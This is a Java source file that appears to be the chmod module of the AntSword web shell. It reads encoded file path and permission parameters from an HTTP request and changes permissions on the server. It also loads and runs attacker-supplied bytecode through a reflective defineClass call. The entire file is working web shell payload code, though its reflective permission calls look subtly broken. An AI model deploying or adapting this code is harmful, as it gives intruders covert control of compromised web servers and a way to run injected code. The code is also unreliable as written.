package filemanager;

import java.io.File;
import java.lang.reflect.Field;

public class Chmod {
    public Object request = null;
    public Object response = null;
    public String encoder = "base64";
    public String cs = "antswordCharset";
    public String randomPrefix = "antswordrandomPrefix";
    public String decoderClassdata;

    @Override
    public boolean equals(Object obj) {
        this.parseObj(obj);
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";
        String varkey1 = "antswordargpath";
        String varkey2 = "antswordargmode";
        String varkeydecoder = "antswordargdecoder";
        try {
            response.getClass().getMethod("setContentType", String.class).invoke(response, "text/html");
            request.getClass().getMethod("setCharacterEncoding", String.class).invoke(request, cs);
            response.getClass().getMethod("setCharacterEncoding", String.class).invoke(response, cs);
            String z1 = decode((String) request.getClass().getMethod("getParameter", String.class).invoke(request, varkey1));
            String z2 = decode((String) request.getClass().getMethod("getParameter", String.class).invoke(request, varkey2));
            this.decoderClassdata = decode((String) request.getClass().getMethod("getParameter", String.class).invoke(request, varkeydecoder));
            output.append(ChmodCode(z1, z2));
        } catch (Exception e) {
            output.append("ERROR:// " + e);
        }
        try {
            Object writer = response.getClass().getMethod("getWriter").invoke(response);
            writer.getClass().getMethod("print", String.class).invoke(writer, tag_s + this.asoutput(output.toString()) + tag_e);
        } catch (Exception ignored) {
        }
        return true;
    }

    String decode(String str) throws Exception {
        int prefixlen = 0;
        try {
            prefixlen = Integer.parseInt(randomPrefix);
            str = str.substring(prefixlen);
        } catch (Exception e) {
            prefixlen = 0;
        }
        if (encoder.equals("base64")) {
            return new String(this.Base64DecodeToByte(str), this.cs);
        }
        return str;
    }

    String ChmodCode(String path, String permstr) {
        try {
            int permissions = Integer.parseInt(permstr, 8);
            File f = new File(path);
            if ((permissions & 256) > 0) {
                f.getClass().getDeclaredMethod("setReadable").invoke(f, true, true);
            }
            if ((permissions & 128) > 0) {
                f.getClass().getDeclaredMethod("setWritable").invoke(f, true, true);
            }

            if ((permissions & 64) > 0) {
                f.getClass().getDeclaredMethod("setExecutable").invoke(f, true, true);
            }
            if ((permissions & 32) > 0) {
                f.getClass().getDeclaredMethod("setReadable").invoke(f, true, false);
            }
            if ((permissions & 16) > 0) {
                f.getClass().getDeclaredMethod("setWritable").invoke(f, true, false);
            }
            if ((permissions & 8) > 0) {
                f.getClass().getDeclaredMethod("setExecutable").invoke(f, true, false);
            }
            if ((permissions & 4) > 0) {
                f.getClass().getDeclaredMethod("setReadable").invoke(f, true, false);
            }
            if ((permissions & 2) > 0) {
                f.getClass().getDeclaredMethod("setWritable").invoke(f, true, false);
            }
            if ((permissions & 1) > 0) {
                f.getClass().getDeclaredMethod("setExecutable").invoke(f, true, false);
            }
        } catch (Exception e) {
            return "0";
        }
        return "1";
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[]) obj;
            request = data[0];
            response = data[1];
        } else {
            try {
                request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
                response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception e) {
                request = obj;
                try {
                    Field req = request.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    Object request2 = req.get(request);
                    Field resp = request2.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    response = resp.get(request2);
                } catch (Exception ex) {
                    try {
                        response = request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                    } catch (Exception ignored) {

                    }
                }
            }
        }
    }

    public String asoutput(String str) {
        try {
            byte[] classBytes = Base64DecodeToByte(decoderClassdata);
            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClassMethod.setAccessible(true);
            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), classBytes, 0, classBytes.length);
            return cc.getConstructor(String.class).newInstance(str).toString();
        } catch (Exception e) {
            return str;
        }
    }

    public byte[] Base64DecodeToByte(String str) {
        byte[] bt = null;
        String version = System.getProperty("java.version");
        try {
            if (version.compareTo("1.9") >= 0) {
                Class clazz = Class.forName("java.util.Base64");
                Object decoder = clazz.getMethod("getDecoder").invoke(null);
                bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
            } else {
                Class clazz = Class.forName("sun.misc.BASE64Decoder");
                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
            }
            return bt;
        } catch (Exception e) {
            return new byte[]{};
        }
    }
}
